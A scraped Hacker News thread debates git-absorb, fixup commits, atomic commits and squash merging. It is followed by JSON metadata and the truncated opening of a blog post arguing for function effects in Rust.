an extended period.) reply Terr_ 8 hours agorootparent> There's zero value in retaining mistakes that were never merged into `master`. Not to be too pedantic about this, it sounds like you mean flawed commits that were merged into master, but never had a chance to be the HEAD of master? (In other words, they always arrived along with a fix-commit too, so that nobody checking out code could've hit the bug.) > In fact there is negative value because it makes the history harder to follow. It also hampers your ability to use tools like git-bisect to detect when behavior changed, especially if some of the bad commits won't compile or pass unit tests. reply globular-toast 12 hours agoparentprevWhy store git history at all? It's useless if you don't take care of it. Have you ever used git history for anything? People use it to find the source of regressions (you can do it quite quickly using git bisect). reply keybored 9 hours agorootparentHappens on all these threads. - Thread: This helps you make a useful Git history - Counter-point: Why are you using a version control system to make a useful history? Why does the history matter? I have been developing software for eighty years and neither I nor anyone I’ve met have cared. reply jeltz 7 hours agorootparentprevI use the git history all the time. For example the git history of PostgreSQL is amazing but I have also worked with proprietary software with good git history. And one key to good git history is people splitting up big PRs in multiple commits. reply froh 11 hours agorootparentprevthe git history of the linux kernel documents the Linux kernel detailed Design, the reasoning how things fit together. I've used it several times to understand why things are done the way they are. The discussion leading to this design is encoded in the revisions of the patch series, browsable on patchworks. I agree to your point that the git history has to be taken care of to be useful. reply globular-toast 10 hours agorootparentMy question was, of course, rhetorical. This and hunting regressions are two great reasons to keep history. \"What did John do on Tuesday morning\" is not a good reason to keep history. Neither is \"This change was made as part of a sprawling \"fix\" commit that happened on Thursday afternoon\". The important point is if you are going to keep history at all it needs to be kept in a state that is actually useful, meaning useful for the first two things, not the last two. Otherwise it's just a waste of disk space. The git history is meticulously maintained which is what makes it actually useful. reply OJFord 5 hours agoprevThis makes no sense to me, why would a conflict-free modifiable commit within the last 10 be the one I want to fixup any more often than roughly 1 in 10? I fixup^ frequently, often often with conflict to resolve in the process, and I have never ever thought 'if only something would automatically choose the target commit for me', even if it was advanced AI why would I trust it to be what I wanted? ^my alias is: !f(){ target=\"$(test -n \"$1\" && git rev-parse \"$1\" || git fzsha rev-parse)\"; git commit --fixup=\"$target\" ${@:2} && EDITOR=true git rebase -i --autostash --autosquash \"$target^\"; }; f `git fzsha` being another alias of mine to choose the target commit with fzf if not given. I rarely use that though, because usually I know it's HEAD~5 or whatever from doing it a second ago, or I've already been looking at the log to work out what I want. reply tcoff91 15 hours agoprevJust use magit and easily make fixup! commits with like 3 key presses. Even if you don't use emacs keeping it around just to use magit is worth it. Edamagit for vscode users is not as good but it does this particular workflow great. reply psanford 14 hours agoparentI use magit. I still use git absorb. The issue for me is not the speed at which I can run the interactive rebase, it is the amount of looking I have to do to find the correct commit to fixup onto in a big stack of commits. git absorb figures that out for me. reply accelbred 14 hours agoparentprevmagit supports git-absorb out of the box if its installed; see the magit-commit-absorb command. I find it quite useful. reply bananapub 10 hours agoparentprevmagit is fantastic but this isn't at all the same thing. fixup is \"stage changes, users selects past commit to fixup, commit staged changes\" absorb is \"stage changes, git-absorb figures out which past commit to fixup, commit staged changes\" reply parasti 11 hours agoprevTIL about `git commit --fixup` and `git rebase --autosquash`. Interactive git rebase is by far my favorite Git tool to use, it scratches a particular itch to create perfect logically atomic commits. That said, sometimes this kind of history editing tends to backfire spectacularly because these crafted perfect commits have actually never been compiled and tested. reply mst 5 hours agoparentI tend to go back through and build+test each of my newly crafted commits locally (and for preference have CI set up such that it'll go \"hey, haven't seen these commits\" and do it again itself). Some people find doing so this boring and annoying. For whatever reason my brain finds it zen and satisfying. reply ssijak 8 hours agoprevDo people actually check commit history in detail so often that they absolutely find so much value in ultra clean commit history? I never understood that obsession with 100% clean history. reply mst 5 hours agoparentWhen I'm hunting a mistake (even/especially my own) finding the commit that introduced the bad line via blame and then looking at that specific diff is extremely handy. Also being able to bounce back and forth between the first broken one and the one before running tests while I work out exactly what I messed up and how. I wouldn't say I put the effort in to get to 100% clean but something like 95% clean makes future me significantly less enraged at past me's mistakes. reply asqueella 6 hours agoparentprevYou don’t even have to do archaeology to benefit from clean commits, it helps tremendously during review too. How do you review nontrivial changes without splitting them in digestible chunks? reply freedomben 7 hours agoparentprevYes, absolutely. Writing out a change log when you have clean commit history is a trivial task. Doing so when it's not clean, can be arduous and take hours, and then still end up being inaccurate. I also frequently try to find when some bug or change was introduced in the get history, so that I can understand why it was done through the context. Context. When it is just thrown in some random commit that doesn't even have much of a commit message, it is utterly useless. When it is part of a commit that is atomic and targeted at one thing, it is trivial to see why it was done. Even when the comment isn't super helpful (which is common despite intentions, because predicting the future and what will be useful in the future is very difficult) it's still valuable because you can see the code in its full context and it's often clear what it's doing. So yes, I am a big believer in clean commit history with atomic, single commits that represent the task someone was doing. For example, If it was a bug fix, then the bug fix will be in its own commit with a commit message describing the bug that is being fixed. reply playingalong 7 hours agoparentprevDo people wash their hands 15 times a day so that they absolutely fine so much value in getting rid of the bugs? The answer is: some do, some don't. reply chippiewill 2 hours agoparentprevOnly in codebases that have good commit history reply cryptonector 2 hours agoparentprevYes. When doing `git bisect`, for example. reply PhilipRoman 5 hours agoparentprevDoesn't have to be 100% clean, but history has tremendous value to me. Often the most important question for me when fixing a problem is \"was this intentional\" (aka did that guy (who left 10 years before I arrived) know what he was doing?). As far as I remember, I've had to check history for about 2/3 of bugs I've fixed. In a perfect world each system would be documented and tested well enough that correctness could be derived from first principles, but we do not live in a perfect world :( reply baruch 7 hours agoparentprevI do. To learn a code base it before tremendously, also to find what happened and why things were done it is off great help. I don't need it every day but I routinely do git archeology. reply jcon321 6 hours agoparentprevYea teams that have poor tracking and no PR practices. reply cocoto 3 hours agoprevSmall question to anyone with this workflow. Do you (re)run CI on every affected commit? If no, what is the point of small commits if you lose any guarantees? I much prefer the honest linear non-modified history. reply enw 5 hours agoprevIn what situations does this solve a problem? In our projects we only enable squash merge in GitHub and the PRs can have any commits you want. The squashed commit includes link to PR, and PR has detailed summary (which wouldn’t be practical in the commit message). reply MBlume 18 hours agoprevI've been using this workflow with hg and it's great, happy to see a git port reply toastal 9 hours agoparentDarcs documentation suggests amending & fixing up WIP commits too reply optymizer 18 hours agoparentprevOne of my favorite Sapling commands at Meta reply pdpi 18 hours agorootparentYeah, it singlehandedly turned me on to Mercurial when I was there, and has massively shaped the way I use git ever since. reply Aissen 6 hours agoprevThis looks a lot like git-fixup[1], which I have been using for a few years. I might try git-absorb since it looks quite interesting. [1] https://github.com/keis/git-fixup reply taberiand 16 hours agoprevThis sounds very useful, I frequently reset soft and recommit in batches of related changes before PR and this sounds like it streamlines integrating updates quite nicely reply thecopy 7 hours agoprevIf i understand this will break \"changes since my last review\" and disconnect PR review comments in GitHub? reply jeltz 7 hours agoparentNo, why would it? reply adastra22 16 hours agoprevThe thing that I never knew I needed, but I predict within a few days I won’t be able to live without. Thank you! reply saagarjha 14 hours agoprevThis seems neat in theory but I would be perpetually concerned that it is going to pull some change I don't mean to commit and put it into something for review. How well does it do at that, anecdotally? reply mook 11 hours agoparentIt deals with things that have been staged, so if you don't want to commit then don't stage it. I believe a dirty working tree is fine (and gets ignored). reply psanford 14 hours agoprevI'm a huge fan of git absorb. I love tools that do-the-right-thing so I can think less. That is what git absorb is. reply tripdout 10 hours agoprevHow does it figure out which commit to add each change to? reply andsens 10 hours agoparent7 lines into the README buddy: > The command essentially looks at the lines that were modified, finds a changeset modifying those lines, and amends that changeset to include your uncommitted changes. reply bananapub 10 hours agoparentprevit explains it in literally the first paragraph: https://github.com/tummychow/git-absorb?tab=readme-ov-file#g... > The command essentially looks at the lines that were modified, finds a changeset modifying those lines, and amends that changeset to include your uncommitted changes. reply a1o 17 hours agoprevUhm, I do a lot of git rebase -i HEAD~2 where I just squash the commit on the latest or sometimes I need to reorder and move the fix commits in specific commits in Pars that multiple commits, which I then need to push force. Is this for a similar use-case? I am not familiar with fixup or how it works. reply cryptonector 2 hours agoparentYes. This saves you having to `git rebase -i` or `git rebase --autosquash` to get the fixup to be \"absorbed\" into the commit it is meant to fix up. reply hoten 15 hours agoparentprevfixup lets you mark a change to be rolled back into a previous commit, without changing the history (yet). When you do `git rebase --autosquash` it then automatically moves those commits as `fixup` in the right places. It helps to queue up many fixups at once and only have a single rebase to do when you're done (or for reviewers to see just the changes in a review tool, not have to reassess the entire commit because you already rebased) btw you could be doing `git commit --amend` if you just want to add to the last commit. reply mckn1ght 17 hours agoparentprevfixup works with rebase if you add the -a flag for autosquash. try it and you’ll see the commits already reordered for you in the interactive menu. also you can write HEAD~2 as @^^ if you want to save a couple keystrokes! reply rom1v 13 hours agorootparentNit: Or @~2 (@ is HEAD, so @^^ is HEAD^^). reply AlexCoventry 17 hours agoparentprevYou can also just press `c`, then `F`, in magit. reply globular-toast 8 hours agoprevThere seems to be an alternative implementation called git-autofixup: https://github.com/torbiak/git-autofixup Has anyone compared the two? reply juped 15 hours agoprevIf I understand the logic it uses correctly this will nearly always attach the fixup to the right commit. It's not for me because I do this manually too fluidly but it seems like a good tool. reply renewiltord 17 hours agoprevPretty clever impl of a tool. I'll be using it, thanks. reply lr4444lr 17 hours agoprevyou don't want to shove them all into an opaque commit that says fixes, because you believe in atomic commits. Sure I do. The whole branch will be squashed anyway before it's merged in, and a single \"fixes\" commit while still on its own branch will be easier to track in a PR for addressing everything pointed out earlier. I mean, don't let me stop anyone from using this or --fixup if this is your flow, but this solves a problem neither I nor anyone in my last 10 years of working with code has. reply imiric 16 hours agoparentEvery team is free to choose what works best for them, but IMO always squashing PRs is not a good strategy. Sometimes you do want to preserve the change history, particularly if the PR does more than a single atomic change, which in practice is very common. There shouldn't be a static merge type preference at all, and this should be chosen on a case-by-case basis. At the risk of sounding judgemental, I think this preference for always squashing PRs comes from a place of either not understanding atomic commits, not caring about the benefits of them, or just choosing to be lazy. In any case, the loss of history inevitably comes at a cost of making reverting and cherry-picking changes more difficult later, making `git bisect` pretty much worthless, and losing the context of why a change was made. reply boolemancer 15 hours agorootparent> At the risk of sounding judgemental, I think this preference for always squashing PRs comes from a place of either not understanding atomic commits, not caring about the benefits of them, or just choosing to be lazy. In any case, the loss of history inevitably comes at a cost of making reverting and cherry-picking changes more difficult later, as well as losing the context of why a change was made. 1) Why are you ever reverting/cherry-picking at a more granular level than an entire PR anyway? The PR is the thing that gets signed-off on, and the thing that goes through the CI build/tests, so why wouldn't that be the thing kept as an atomic unit? 2) I don't think I've ever cared about the context for a specific commit within a PR once the PR has been merged. What kind of information do you expect to get out of it? Edit: How does it remove the context for a change or make `git bisect` useless? How big are your PRs that you can't get enough context from finding the PR commit to know why a particular change was made? reply imiric 10 hours agorootparent> The PR is the thing that gets signed-off on, and the thing that goes through the CI build/tests, so why wouldn't that be the thing kept as an atomic unit? Because it often isn't. I don't know about your experience, but in all the teams I've worked in throughout my career the discipline to keep PRs atomic is almost never maintained, and sometimes just doesn't make sense. Sometimes you start working on a change, but spot an issue that is either too trivial to go through the PR/review process, or closely related to the work you started but worthy of a separate commit. Other times large PRs are unavoidable, especially for refactorings, where you want to propose a larger change but the history of the progress is valuable. I find conventional commits helpful when deciding what makes an atomic change. By forcing a commit to be of a single type (feature, fix, refactor, etc.) it's easier to determine what belongs together and what not. But a PR can contain different commit types with related changes, and squashing them all when merging doesn't make the PR itself atomic. > I don't think I've ever cared about the context for a specific commit within a PR once the PR has been merged. What kind of information do you expect to get out of it? Oh, plenty. For one, when looking at `git blame` to determine why a change was made, I hope to find this information in the commit message. This is what commit messages are for anyway. If all commits have this information, following the history of a set of changes becomes much easier. This is helpful not just during code reviews, but after the merge as well, for any new members of the team trying to understand the codebase, or even the author themself in the future. reply boolemancer 30 minutes agorootparent> Because it often isn't. I don't know about your experience, but in all the teams I've worked in throughout my career the discipline to keep PRs atomic is almost never maintained, and sometimes just doesn't make sense. Sometimes you start working on a change, but spot an issue that is either too trivial to go through the PR/review process, or closely related to the work you started but worthy of a separate commit. Other times large PRs are unavoidable, especially for refactorings, where you want to propose a larger change but the history of the progress is valuable. In my experience at least, PRs are atomic in that they always leave main in a \"good state\" (where good is pretty loosely defined as 'the tests had to pass once'). Sometimes you might make a few small changes in a PR, but they still go through a review. If they're too big, you might ask someone to split it out into two PRs. Obviously special cases exist for things like large refactoring, but those should be rare and can be handled on a case by case basis. But regardless, even if a PR has multiple small changes, I wouldn't revert or cherry-pick just part of it. Just do the whole thing or not at all. > Oh, plenty. For one, when looking at `git blame` to determine why a change was made, I hope to find this information in the commit message. This is what commit messages are for anyway. If all commits have this information, following the history of a set of changes becomes much easier. This is helpful not just during code reviews, but after the merge as well, for any new members of the team trying to understand the codebase, or even the author themself in the future. Yeah but the context for `git blame` is still there when doing a squash merge, and the commit message should still be relevant and useful. My point isn't that history isn't useful, it's that the specific individual commits that make up a PR don't provide more useful context than the combined PR commit itself does. I don't need to know that a typo was fixed in iteration 5 of feedback in the PR that was introduced in iteration 3. It's not relevant once the PR is merged. reply imp0cat 14 hours agorootparentprevad 1) I'd guess it depends on the size of the PR. If they're massive it kinda makes sense. reply lr4444lr 2 hours agorootparentIf only we had a software methodology that championed incremental change... reply lr4444lr 3 hours agorootparentprevSince we're taking the risk of being judgmental, I'd suggest the preference for not squashing branches to preserve the developer's local commit history when merged into the main line suggests a misunderstanding between branches and commits, but if it works for you more power to you. reply seadan83 14 hours agorootparentprevWhat are your thoughts on the \"ship, show, ask\" workflow? [1] In that workflow, small stuff is simply pushed, which allows PRs to be more single focused and more atomic. Perhaps your only objection is direct pushes to master? I am really curious if that workflow otherwise addresses all of the downsides you stated while still allowing for all PRs to be uniformly rebase-squash merged. [1] https://martinfowler.com/articles/ship-show-ask.html reply imiric 10 hours agorootparentI wasn't aware of this particular workflow, but I've heard of similar ones before. The late Pieter Hintjens, of ZeroMQ fame, advocated for a strategy called \"optimistic merging\"[1], which essentially abandons the standard code review process in favor of merging changes ASAP, and fixing any issues as they arise later. I'm not a fan of this. It allows contributors to abandon any established coding standards, while placing more burden on maintainers to fix issues later. This in practice never happens, so the quality of the codebase degrades over time. Not to mention that it allows malicious actors to merge changes much more easily. As for \"ship, show, ask\" specifically, I have similar reservations. I think all changes should go through a review process, even if someone just glances at the changes. It not only gives the opportunity to leave feedback, but also serves as communication so that everyone is aware of the proposed changes. Also, making the decision of whether to choose \"ship\", \"show\" or \"ask\" might only work for senior and well disciplined developers. I think that in most teams you have a mixture of experience, so you'd inevitably end up in situations where a change should've been \"show\" or \"ask\", but was \"ship\", and viceversa. I don't think teams will ever align on a single strategy to make a correct decision, since it's based on subjective opinion to begin with. Always following the same workflow gets rid of these uncertainties. [1]: http://hintjens.com/blog:106 reply seadan83 1 hour agorootparentAfter having done a few thousand CRs, I've come to believe that CR is of mixed value. Not always good, nor all good. Removing the bad CRs and doing CR when it is useful IMO helps maximizes productivity. First, I assume a few constraints on \"ship, show, ask.\" First constraint is that all changes go for at least one, if not multiple self reviews. Second, the ability to ship is not outright granted. Until someone has demonstrated they can ship reasonable, working code- they are not given write permissions. They must \"ask.\" Next, ship is not a given. Things that are not interesting are shipped. This enhances the communication part of PRs. If a PR is sent, it is important or wants extra review. That removes the noise of everything being a PR, and removes the noise from PRs where minor changes are smuggled in for the sake of efficiency. This also removes a lot of nitpicking as well. When asked to CR, we often feel we need to CR, and if our only feedback are minor things- then that is the feedback. 'Perfect' becomes the enemy of good enough. Saving time, efficiency are huge. Do CR when it is useful, and only then. Last, post merge reviews can still be done by the maintainers to ensure things are going smoothly. Hence, post merge review is an option for both ship and show. This means the coding lifecycle is blocked in CR only when the CR is valuable. That CR is blocking I feel is a very important drawback. Typos linger because time is finite and only those that do not appreciate that will try to fix everything. The team then gets bogged down spending too much time fixing small things. Leaving the small things is not ideal either. If the overhead to fix small things is tiny, suddenly it takes 5 minutes to do what would otherwise require another person and possibly the next day. For example, A PR preceded by renaming a few files is powerful. That is a game changer compared to a hard to review CR, staged PRs, or simply never doing the renaming because it runs the diff. Blanket CR can also ossify a project. Most projects I've seen are written quickly and in large chunks. If they are reviewed at all, it is a lot of 2000 line \"LGTM\", zero comment reviews. Then when careful CR is done (often by the \"scaling\" team), suddenly things that are original become gospel. The CR debates the absolute best naming, original intent, spending magnitudes more time than was originally put into the code in the first place. Meanwhile the code was done quickly, slightly worse than good enough- and now good enough is not even good enough. The CR now demands a far higher quality bar compared to the original code when it was written. Fixing a 50k line code base at 500 lines per day is a way to _not_ fix that codebase. The original bad code is therefor fossilized into the project. Time and effort are not infinite. That turned into a bit of a rant. I wanted to demonstrate that: (A) there are guard rails on SSA so it is not just a free for all. (B) selectively requesting CR when it is valuable amplifies the value of CR. (C) removing the noise of everything is a PR makes PRs stronger as communication tools. (D) post merge review of all code can still meet the goal of reviewing everything. I'll tie this back to git absorb now. Git absorb rebases, which arguably invalidates any CR that was done. Ship-Show-Ask allows for there to be more explicit trust where someone does their git absorb, redoes the self review and then merges. Further, the workflow helps clean up PRs to not be as many commits. Though, I do think the discussion of workflows and CR is really fascinating. Having been essentially just the one senior, or one of two on most all projects I've worked on in the last decade, - I'm certainly (overly) eager to discuss in detail the workflows. reply hamandcheese 15 hours agorootparentprevgit bisect is still perfectly useful. It will locate the squashed commit/pr which is more than enough for me to zero in on whatever the bug is. reply imiric 15 hours agorootparentHow helpful is it if it points you to a commit with 10 different changes? Will you go back to the PR to see the context of each change, and try to guess where the issue is based on the behavior? You're right back at manual debugging at that point. This workflow really shines when it points you to the actual atomic commit that introduced the issue. Then you're simply a `git revert` away from undoing it, without risking breaking anything else, barring functional conflicts, of course. Try doing that with a squashed commit. reply burntsushi 15 hours agorootparentI'm with you (see my other top level comment), but > Then you're simply a `git revert` away from undoing it, without risking breaking anything else This needs careful qualification. On GitHub at least, it is difficult to ensure every commit passes CI. This can result in skipping during bisect for a busted commit. It doesn't happen often enough in my experience too convince me to give up a cleaner history, but it's a downside we should acknowledge. Ideally GitHub would make testing each individual commit easier. reply keybored 11 hours agorootparentA revert two weeks after the fact will create a new and unique tree (untested) in any case. I don’t if you’re saying that the original commit or the revert might be untested. In either case the brand new revert could break something. Who knows, it’s a new state. > It doesn't happen often enough in my experience too convince me to give up a cleaner history, but it's a downside we should acknowledge. There are tools for that. https://github.com/mhagger/git-test reply burntsushi 6 hours agorootparentAll I'm trying to do is qualify things so that the trade offs can be more honestly assessed. The bisect for finding that commit might not work as well as you hope if you need to skip over commits that don't build or whose tests fail for other reasons. Those things can happen when you aren't testing each individual commit. I understand there are tools for testing each individual commit. You'll notice that I didn't say it's impossible to ensure every commit is tested. Needing to use random tools to do it is exactly what makes it difficult. And the tool you linked says literally nothing about using it in CI. How good is its CI integration? There's more to it than just running it. On top of all of that, there are more fundamental problems, like increasing CI times/costs dramatically for PRs split into multiple fine grained commits. Again, anyone here can go look at my projects on GitHub. I try hard to follow atomic commits. I think it's worth doing, even with the downsides. But we shouldn't try to make things look rosier than they actually are. reply recursive 15 hours agorootparentprevI've not seen code where this revert thing would work. If it's in the PR something else now depends on it. reply phist_mcgee 15 hours agorootparentprevIf you go all in on atomic commits, you're probably going to be rebasing a lot. IME, that's a lot of time spent trying to make a \"clean\" history all for the benefit of looking back infrequently at what broke. Can't you just inspect your merged branches and bisect those instead if using the squash strat? reply recursive 15 hours agorootparentprevThere can be another reason. I do care about the benefits, but I don't think there really are any. reply rom1v 13 hours agoparentprev> The whole branch will be squashed anyway before it's merged in That looks like a very wrong process to me. Why would you even want to do that? reply travisjungroth 12 hours agoparentprevThat whole paragraph is the conditions under which this tool would be useful. If they’re not true for you, this isn’t for you. This is like quoting “You have a feature branch” and saying “No I don’t.” reply notlinus 13 hours agoparentprevI wish people would stop saying \"atomic commits\" and start saying \"main/master is stable\", because that's what they actually mean. Every git commit is atomic, by definition... But people want every single possible revision to be green and buildable, which is different, and has nothing to do with git. I don't think it makes sense (tags are a lot more helpful for marking what is and isn't stable), but hey. reply usr1106 10 hours agorootparentYes, atomic commits is not a very descriptive term. But main/master is stable is only a necessary condition, not a sufficient one. If you squash (or mix from the beginning) several unrelated changes into a single commit, main/master would be stable. AFAIK atomic commits means nothing can be taken away without breaking the change and nothing needs to be added to make the change work. How to express that without 2 clauses is indeed a good question. reply assiniboine 10 hours agorootparentAtomic commits ensure each change works independently. reply usr1106 10 hours agorootparentThat cannot be achieved in general. Later commits often depend on some earlier one. reply krick 16 hours agoparentprevGood for you, but you (and, apparently, everyone in your last 10 years of working with) would have a problem if I was the one reviewing your commits. I mean, to be fair, I often did let it slide (for political/social/practical reasons) and use autosquash, but I always actively discouraged it, so if you are a junior or a new hire with uncertain usefulness status, I'd at least talk to you about that and ask you to fix it. This is not an ok practice, it's only acceptable because too many people don't have a habit of making their own bed and much bigger kinds of technical debt get ignored because in the end it's about shipping stuff, so you just sigh and say \"oh, whatever\". reply hamandcheese 15 hours agorootparentIt has always been enough for me to trace a change back to its original pull request. Extra granularity might be nice sometimes but never essential. And I do a fair bit of digging through git history. Not sure what makes it \"not an ok practice\". Squashing works fine and lets the 80% of people who don't care spend their efforts thinking about something other than a perfect git history. reply notlinus 13 hours agorootparentprevFor what it's worth, you're right. reply dmead 14 hours agoprevThis sounds great,but kind of an anti pattern in git. I definitely want to have a \"fixes\" commit on my feature branch. You should do whatever you want on a feature branch so long as your trunk has a clean history. This sounds like someone wanted to lift a feature of changesets in mercurial into git. I don't think this is safe and probably breaks a lot of people's mental model of git changelogs being an immutable data structure. reply cryptonector 2 hours agoparentThis is no more nor less safe than `git rebase`. reply saagarjha 14 hours agoparentprevAt some point the changes are going to get merged in, no? And that that point I would really like the commits to be nice. reply snatchpiesinger 10 hours agorootparentgit log --first-parent reply dmead 11 hours agorootparentprevThat's why you squash and make the commit message readable. reply cryptonector 2 hours agorootparentNo, you don't want to squash everything into one commit. You want logical, clean history. reply saagarjha 11 hours agorootparentprevSquash all the commits I worked so hard to make atomic? reply rglynn 16 hours agoprevAs a frequent user of fixups, this feels like a solution for already broken workflows. > Instead of manually finding commit SHAs for git commit --fixup Assuming you are using fixups, is this actually a problem? I could see this being a possibility if you are: A. not practicing atomic commits or B. have so many commits in your branch that this is a chore. A. seems unlikely if you are already using fixups and B. seems like a problem worth solving properly rather than going around. To sum up, I'm not convinced by the elevator pitch. However, I am keenly aware that the workflows of developers differ vastly across industry, company size, technology etc. I'd be interested to understand what problems this or similar tools solve? reply cryptonector 2 hours agoparentTools like this are useful for users who are not power users. reply seadan83 14 hours agoparentprevWhat solutions have you seen for problem (B)? The open source example is hard to fix AFAIK. Everything needs to be a PR, some changes to older code bases are simply going to be either large or multi-stepped (many commits, and sending them all as stacked PRs is often not efficient enough to be effective). In industry, I think there are more solutions available. Though, overall, I am very curious how you would go about solving B. reply adastra22 16 hours agoparentprevHow would you manage long-lived branches that are periodically rebased against the master branch (when there is a release, for example)? reply DanielHB 11 hours agoprev [–] Am I the only one who doesn't like atomic commits (or stacked PRs like graphite)? When I work on large PRs I often rewrite and move things around so much that trying to keep all commits in sync is a nightmare. I do try to split the work if it is very clearly isolated, but that usually means less than 3 PRs. I have tried graphite `gt absorb` (which might use this project?) and it still creates a mess. What I do that I wish more people did is that I heavily comment my own PRs with information that doesn't make sense in comments (for example on line X I add a comment: moved here from Y file). > You have fixes for the bugs, but you don't want to shove them all into an opaque commit that says fixes I actually like this, but split each fix in its own commit and during review I answer to comments with: \"fixed in commit {commit-sha}\". So _often_ bugs are introduced during PR review, if the fixes are isolated it is easier to see what changes between review rounds. reply alex23478 11 hours agoparent [–] I think this really boils down how your team is using Git and which code review tool you're using. (I've never used Gerrit personally, but as far as I understand it, we wouldn't have this conversation, since it aims to refine a single change by re-submitting a commit over and over again?) For GitHub/GitLab reviews, I'm totally with you - this makes it more convenient for the reviewer to check that/how you've responded to feedback. But now if you merge this without squashing, your Git history on the main branch contains all your revisions, which makes operations like bisecting or blame more complicated. For me personally, the sweet spot is currently a mix of stacked-commits and the PR workflow: Use a single commit as the unit of review, and polish that commit using a PR, and use the commit descriptions within that PR to tell the story of you responding to feedback. Then, squash merge that commit. This provides both a good review experience and a tidy history. If you find a strange bug later and can't grasp how someone could have come up with that, the PR still has all the history. Together with tools such as git-branchless, this also makes working on stacked-PRs a breeze. reply DanielHB 10 hours agorootparentI have used standard github and graphite reviews. I tend to prefer what I mentioned in my original post than graphite stacked PR review (which are essentially atomic commits) Yes I also advocate for squash-before-merge, so a lot of little commits is doesn't show up in the main history. > For me personally, the sweet spot is currently a mix of stacked-commits and the PR workflow: Use a single commit as the unit of review, and polish that commit using a PR, and use the commit descriptions within that PR to tell the story of you responding to feedback. Then, squash merge that commit. To me time spent on commit polishing (and dealing with conflicts) is time not spent on product. Author comments on PR review, squash-before-merge, and sit-together with reviewer for big PRs to me seems a better compromise. I don't think super polished git history is worth the extra effort for most types of product, as long as I can track a change down to a PR discussion that is enough to me. From there I can track PR review commit changes individually if needed. Like it is so uncommon for me to go digging on git history that deeply, usually all I care is \"code behaving weird && line changed < 1 month ago then probably a bug introduced then\" Of course if you are working on aviation software and the like maybe the priorities are different. But I have spent way too much time dealing with rebase conflicts when trying to chop up my PRs into smaller commits. Dealing with these conflicts often introduces bugs too. reply usr1106 10 hours agorootparentprev [–] Why are people talking about stacked PRs/MRs? Shouldn't they be called queued? A stack is LIFO and a queue is FIFO. (Of course in some special case you might want to merge a later one earlier, but I don't think that's the normal case people are talking about.) reply DanielHB 10 hours agorootparent [–] Why is it a \"Pull Request\" instead of a \"Push Request\"? Someone named it that way and it stuck. reply usr1106 10 hours agorootparent [–] You request others/the maintainer to pull. That was the only way before the forges. I guess gitlab's merge request is more descriptive. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Git Absorb is a tool derived from Facebook's hg absorb, designed to streamline version control by automatically folding uncommitted changes into appropriate draft ancestor changesets.",
      "It simplifies the process of applying review feedback by avoiding manual commits or interactive rebases, making it easier to manage feature branches and bug fixes.",
      "Git Absorb can be installed via system package managers or compiled from source, and it offers configurable options to adjust commit ranges, auto-stage changes, and more."
    ],
    "commentSummary": [
      "Git-absorb is an automated tool for creating fixup commits in Git, streamlining the process of correcting issues across multiple commits.",
      "It is particularly useful for maintaining clean commit histories in pull requests (PRs) by automatically associating changes with the correct commits, reducing manual effort.",
      "The tool is praised for its accuracy in identifying the right commits for changes, minimizing false positives and negatives, and saving time for developers who prefer logically small commits."
    ],
    "points": 374,
    "commentCount": 213,
    "retryCount": 0,
    "time": 1727309573
  },
  {
    "id": 41654871,
    "title": "Rewriting Rust",
    "originLink": "https://josephg.com/blog/rewriting-rust/",
    "originBody": "Seph 26 Sep 2024 on rustprogramming Rewriting Rust The Rust programming language feels like a first generation product. You know what I mean. Like the first iPhone - which was amazing by the way. They made an entire operating system around multitouch. A smart phone with no keyboard. And a working web browser. Within a few months, we all realised what the iPhone really wanted to be. Only, the first generation iphone wasn't quite there. It didn't have 3G internet. There was no GPS chip. And there was no app store. In the next few years, iPhones would get a lot better. Rust feels a bit like that first iPhone. I fell in love with Rust at the start. Algebraic types? Memory safety without compromising on performance? A modern package manager? Count me in. But now that I've been programming in rust for 4 years or so, it just feels like its never quite there. And I don't know if it will ever be there. Progress on the language has slowed so much. When I first started using it, every release seemed to add new, great features in stable rust. Now? Crickets. The rust \"unstable book\" lists 700 different unstable features - which presumably are all implemented, but which have yet to be enabled in stable rust. Most of them are changes to the standard library - but seriously. Holy cow. How much of this stuff will ever make it into the language proper? The rust RFC process is a graveyard of good ideas. Features like Coroutines. This RFC is 7 years old now. Make no mistake - coroutines are implemented in the compiler. They're just, not available for us \"stable rust\" peasants to use. If coroutines were a child, they would be in grade school by now. At this point, the coroutines RFC has lasted longer than World War 1 or 2. I suspect rust is calcifying because its consensus process just doesn't scale. Early on, rust had a small group of contributors who just decided things. The monsters. Now, there are issue threads like this, in which 25 smart, well meaning people spent 2 years and over 200 comments trying to figure out how to improve Mutex. And as far as I can tell, in the end they more or less gave up. Maybe this is by design. Good languages are stable languages. It might be time to think of rust as a fully baked language - warts and all. Python 2.7 for life. But that doesn't change anything for me. I want a better rust, and I feel powerless to make that happen. Where are my coroutines? Even javascript has coroutines. Fantasy language Sometimes I lie awake at night fantasising about forking the compiler. I know how I'd do it. In my fork, I'd leave all the rust stuff alone and but make my own \"seph\" edition of the rust language. Then I could add all sorts of breaking features to that edition. So long as my compiler still compiles mainline rust as well, I could keep using all the wonderful crates on Cargo. I think about this a lot. If I did it, here's what I'd change: Function traits (effects) Rust has traits on structs. These are used in all sorts of ways. Some are markers. Some are understood by the compiler (like Copy). Some are user defined. Rust should also define a bunch of traits for functions. In other languages, function traits are called \"effects\". This sounds weird at first glance - but hear me out. See, there's lots of different \"traits\" that functions have. Things like: Does the function ever panic? Does the function have a fixed stack size? Does the function run to the end, or does it yield / await? If the function is a coroutine, what is the type of the continuation? Is the function \"pure\" (ie, the same input produces the same output, and it has no side effects) Does the function (directly or indirectly) run unsafe code in semi-trusted libraries? Is the function guaranteed to terminate? And so on. A function's parameters and return type are just associated types on the function: fn some_iter() -> impl Iterator { vec![1,2,3].into_iter() } fn main() { // Why doesn't this work already via FnOnce? let x: some_iter::Output = some_iter(); } TAIT eat your heart out. Exposing these properties is super useful. For example, the linux kernel wants to guarantee (at compile time) that some block of code will never panic. This is impossible to do in rust today. But using function traits, we could explicitly mark a function as being able - or unable - to panic: #[disallow(Panic)] // Syntax TBD. fn some_fn() { ... } And if the function does anything which could panic (even recursively), the compiler would emit an error. The compiler already sort of implements traits on functions, like Fn, FnOnce and FnMut. But for some reason they're anemic. (Why??) I want something like this: /// Automatically implemented on all functions. trait Function { type Args, type Output, type Continuation, // Unit type () for normal functions // ... and so on. fn call_once(self, args: Self::Args) -> Self::Output; } trait NoPanic {} // Marker trait, implemented automatically by the compiler. /// Automatically implemented on all functions which don't recurse. trait KnownStackSize { const STACK_SIZE: usize, } Then you could write code like this: fn some_iter() -> impl Iterator { vec![1,2,3].into_iter(); } struct SomeWrapperStruct { iter: some_iter::Output, // In 